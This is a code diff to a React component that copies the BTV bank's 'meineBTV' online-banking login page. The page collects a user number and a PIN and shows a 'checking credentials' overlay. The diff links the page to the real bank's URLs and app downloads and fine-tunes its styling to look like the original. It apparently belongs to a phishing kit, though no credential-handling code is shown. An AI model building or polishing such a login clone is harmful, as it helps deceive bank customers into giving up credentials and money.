@@ -21,11 +21,11 @@ const translations: Record<Lang, {
   next: string;
   firstLogin: string;
   linksTitle: string;
-  links: string[];
+  links: { label: string; href: string }[];
   meldungen: string;
   meldungText: string;
   moreNews: string;
-  footerLinks: string[];
+  footerLinks: { label: string; href: string }[];
   languageNames: string[];
   copyright: string;
 }> = {
@@ -39,18 +39,23 @@ const translations: Record<Lang, {
     firstLogin: "Erstanmeldung",
     linksTitle: "Weiterführende Links",
     links: [
-      "Download BTV Security App -\nApple/Mac",
-      "Download BTV Security App -\nWindows/PC",
-      "meineBTV - Erstanmeldung",
-      "meineBTV - Hilfe und FAQs",
-      "FastClient - Fernwartungstool",
-      "Support +43 505 333 - 1160",
-      "Datenschutz und AGB",
+      { label: "Download BTV Security App -\nApple/Mac", href: "https://btv.at/app/uploads/2025/05/BTV_Security_2.0.5.0_Mac.zip" },
+      { label: "Download BTV Security App -\nWindows/PC", href: "https://btv.at/app/uploads/2025/05/BTV_Security_2.0.5.0.zip" },
+      { label: "meineBTV - Erstanmeldung", href: "https://btv.at/uploads/2021/11/BTV_Security_App_Erstanmeldung.pdf" },
+      { label: "meineBTV - Hilfe und FAQs", href: "https://btv.at/kontakt-services/internetbanking-apps/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=weiterfuehrendelinks&utm_content=outsideportal" },
+      { label: "FastClient - Fernwartungstool", href: "https://btv.at/services/#Fernwartung" },
+      { label: "Support +43 505 333 - 1160", href: "https://btv.at/kontakt-services/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=weiterfuehrendelinks&utm_content=outsideportal" },
+      { label: "Datenschutz und AGB", href: "https://btv.at/rechtliche-hinweise/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=weiterfuehrendelinks&utm_content=outsideportal" },
     ],
     meldungen: "Meldungen",
     meldungText: "Phishing, Smishing und Vishing: Wie können Sie sich vor Datendiebstahl schützen?",
     moreNews: "Weitere Nachrichten anzeigen",
-    footerLinks: ["Impressum", "Rechtliche Hinweise", "Standorte", "Support"],
+    footerLinks: [
+      { label: "Impressum", href: "https://btv.at/impressum/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=footer&utm_content=outsideportal" },
+      { label: "Rechtliche Hinweise", href: "https://btv.at/rechtliche-hinweise/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=footer&utm_content=outsideportal" },
+      { label: "Standorte", href: "https://btv.at/kontakt-services/standorte/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=footer&utm_content=outsideportal" },
+      { label: "Support", href: "javascript:void(0);" },
+    ],
     languageNames: ["Deutsch", "Englisch"],
     copyright: "© 2026 BTV AG",
   },
@@ -64,18 +69,23 @@ const translations: Record<Lang, {
     firstLogin: "First login",
     linksTitle: "Further links",
     links: [
-      "Download BTV Security App -\nApple/Mac",
-      "Download BTV Security App -\nWindows/PC",
-      "meineBTV - First login",
-      "meineBTV - Help and FAQs",
-      "FastClient - Remote support tool",
-      "Support +43 505 333 - 1160",
-      "Privacy and Terms",
+      { label: "Download BTV Security App -\nApple/Mac", href: "https://btv.at/app/uploads/2025/05/BTV_Security_2.0.5.0_Mac.zip" },
+      { label: "Download BTV Security App -\nWindows/PC", href: "https://btv.at/app/uploads/2025/05/BTV_Security_2.0.5.0.zip" },
+      { label: "meineBTV - First login", href: "https://btv.at/uploads/2021/11/BTV_Security_App_Erstanmeldung.pdf" },
+      { label: "meineBTV - Help and FAQs", href: "https://btv.at/kontakt-services/internetbanking-apps/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=weiterfuehrendelinks&utm_content=outsideportal" },
+      { label: "FastClient - Remote support tool", href: "https://btv.at/services/#Fernwartung" },
+      { label: "Support +43 505 333 - 1160", href: "https://btv.at/kontakt-services/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=weiterfuehrendelinks&utm_content=outsideportal" },
+      { label: "Privacy and Terms", href: "https://btv.at/rechtliche-hinweise/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=weiterfuehrendelinks&utm_content=outsideportal" },
     ],
     meldungen: "News",
     meldungText: "Phishing, Smishing and Vishing: How to protect yourself from data theft?",
     moreNews: "Show more news",
-    footerLinks: ["Imprint", "Legal Notice", "Locations", "Support"],
+    footerLinks: [
+      { label: "Imprint", href: "https://btv.at/impressum/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=footer&utm_content=outsideportal" },
+      { label: "Legal Notice", href: "https://btv.at/rechtliche-hinweise/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=footer&utm_content=outsideportal" },
+      { label: "Locations", href: "https://btv.at/kontakt-services/standorte/?utm_source=meinebtvdesktop&utm_medium=referral&utm_campaign=footer&utm_content=outsideportal" },
+      { label: "Support", href: "javascript:void(0);" },
+    ],
     languageNames: ["German", "English"],
     copyright: "© 2026 BTV AG",
   },
@@ -159,7 +169,7 @@ const Btv = () => {
 
   return (
     <>
-      <style>{`.btv-input::placeholder{color:${BTV_BLUE};opacity:1;}.btv-link-text{color:#292929;}.btv-link-row:hover .btv-link-text{color:#668da3;}`}</style>
+      <style>{`.btv-input::placeholder{color:${BTV_BLUE};opacity:1;}.btv-link-text{color:#292929;}.btv-link-row:hover .btv-link-text{color:#668da3;}.btv-footer-link:hover{text-decoration:underline;}`}</style>
       {showLoading && (
         <LoadingOverlay
           message="Anmeldedaten werden überprüft..."
@@ -242,7 +252,7 @@ const Btv = () => {
                   placeholder={t.step1}
                   value={verfNr}
                   onChange={(e) => setVerfNr(e.target.value)}
-                  style={{ ...inputStyle, marginBottom: 14 }}
+                  style={{ ...inputStyle, marginBottom: 14, height: 44, padding: "0 12px" }}
                 />
 
                 <div style={{ display: "flex", gap: 10, marginBottom: 16 }}>
@@ -252,7 +262,7 @@ const Btv = () => {
                     placeholder={t.pinPlaceholder}
                     value={pin}
                     onChange={(e) => setPin(e.target.value)}
-                    style={{ ...inputStyle, flex: "1 1 0", width: 0, minWidth: 0, height: 38, padding: "0 12px" }}
+                    style={{ ...inputStyle, flex: "1 1 0", width: 0, minWidth: 0, height: 44, padding: "0 12px" }}
                   />
                   <div ref={langRef} style={{ position: "relative", flex: "1 1 0", width: 0, minWidth: 0 }}>
                     <button
@@ -266,7 +276,7 @@ const Btv = () => {
                         alignItems: "center",
                         justifyContent: "space-between",
                         textAlign: "left",
-                        height: 38,
+                        height: 44,
                         width: "100%",
                       }}
                     >
@@ -319,7 +329,7 @@ const Btv = () => {
                   </div>
                 </div>
 
-                <p style={{ fontSize: 13, lineHeight: 1.5, margin: "0 0 18px", color: "#000" }}>
+                <p style={{ fontSize: 13, lineHeight: 1.5, margin: "0 0 18px", color: "#292929" }}>
                   {t.sslText}
                 </p>
 
@@ -350,17 +360,19 @@ const Btv = () => {
                   background: "#668da3",
                   color: "#fff",
                   display: "flex",
-                  alignItems: "stretch",
+                  alignItems: "center",
                   justifyContent: "flex-end",
                   fontSize: 14,
                   fontWeight: 700,
                   cursor: "default",
                   minHeight: 44,
+                  paddingRight: 60,
+                  gap: 8,
                 }}
               >
-                <div style={{ width: 1, background: "#fff" }} />
-                <div style={{ padding: "12px 12px" }}>{t.firstLogin}</div>
-                <div style={{ width: 1, background: "#fff" }} />
+                <div style={{ width: 1, height: 16, background: "#fff" }} />
+                <div>{t.firstLogin}</div>
+                <div style={{ width: 1, height: 16, background: "#fff" }} />
               </div>
             </div>
 
@@ -383,9 +395,12 @@ const Btv = () => {
                 {t.linksTitle}
               </h2>
               <div>
-                {t.links.map((label, i) => (
-                  <div
+                {t.links.map((item, i) => (
+                  <a
                     key={i}
+                    href={item.href}
+                    target="_blank"
+                    rel="noopener noreferrer"
                     className="btv-link-row"
                     style={{
                       display: "flex",
@@ -396,11 +411,12 @@ const Btv = () => {
                       fontSize: 12,
                       cursor: "pointer",
                       gap: 8,
+                      textDecoration: "none",
                     }}
                   >
-                    <span className="btv-link-text" style={{ whiteSpace: "pre-line", lineHeight: 1.3 }}>{label}</span>
+                    <span className="btv-link-text" style={{ whiteSpace: "pre-line", lineHeight: 1.3 }}>{item.label}</span>
                     <ChevronRight size={18} color="#000" style={{ flexShrink: 0 }} />
-                  </div>
+                  </a>
                 ))}
               </div>
             </div>
@@ -500,51 +516,26 @@ const Btv = () => {
             </div>
           </div>
 
-          {/* Meldungen */}
-          <div style={{ marginTop: 36 }}>
-            <h3 style={{ fontSize: 16, fontWeight: 400, margin: "0 0 12px", color: "#fff" }}>
-              {t.meldungen}
-            </h3>
-            <div
+          {/* More news button */}
+          <div style={{ textAlign: "center", marginTop: 36 }}>
+            <button
+              onMouseEnter={(e) => (e.currentTarget.style.background = "#336785")}
+              onMouseLeave={(e) => (e.currentTarget.style.background = "#668da3")}
               style={{
-                background: "rgba(255,255,255,0.06)",
-                border: "1px solid rgba(255,255,255,0.12)",
-                padding: "14px 16px",
-                display: "flex",
-                alignItems: "center",
-                justifyContent: "space-between",
-                gap: 12,
-                fontSize: 14,
+                background: "#668da3",
                 color: "#fff",
+                border: "none",
+                padding: "14px 32px",
+                fontSize: 14,
+                fontWeight: 700,
+                cursor: "pointer",
+                borderRadius: 2,
+                fontFamily: "inherit",
+                transition: "background 0.15s ease",
               }}
             >
-              <div style={{ display: "flex", alignItems: "center", gap: 10, minWidth: 0 }}>
-                <ChevronRight size={16} color="#fff" />
-                <span style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
-                  {t.meldungText}
-                </span>
-              </div>
-              <span style={{ flexShrink: 0, fontSize: 13, color: "rgba(255,255,255,0.7)" }}>
-                09.04.2026, 16:23 Uhr
-              </span>
-            </div>
-            <div style={{ textAlign: "center", marginTop: 28 }}>
-              <button
-                style={{
-                  background: "#668da3",
-                  color: "#fff",
-                  border: "none",
-                  padding: "14px 32px",
-                  fontSize: 14,
-                  fontWeight: 700,
-                  cursor: "pointer",
-                  borderRadius: 2,
-                  fontFamily: "inherit",
-                }}
-              >
-                {t.moreNews}
-              </button>
-            </div>
+              {t.moreNews}
+            </button>
           </div>
 
           {/* Footer */}
@@ -559,10 +550,19 @@ const Btv = () => {
               color: "rgba(255,255,255,0.85)",
             }}
           >
-            <img src={atFlagge} alt="AT" style={{ height: 18 }} />
+            <img src={atFlagge} alt="AT" style={{ height: 28 }} />
             <div style={{ display: "flex", gap: 24, flexWrap: "wrap" }}>
-              {t.footerLinks.map((label) => (
-                <span key={label} style={{ cursor: "pointer", fontWeight: 700 }}>{label}</span>
+              {t.footerLinks.map((item) => (
+                <a
+                  key={item.label}
+                  href={item.href}
+                  target={item.href.startsWith("http") ? "_blank" : undefined}
+                  rel="noopener noreferrer"
+                  className="btv-footer-link"
+                  style={{ cursor: "pointer", fontWeight: 700, color: "#fff", textDecoration: "none" }}
+                >
+                  {item.label}
+                </a>
               ))}
             </div>
             <div style={{ marginLeft: isMobile ? 0 : "auto", color: "#fff" }}>
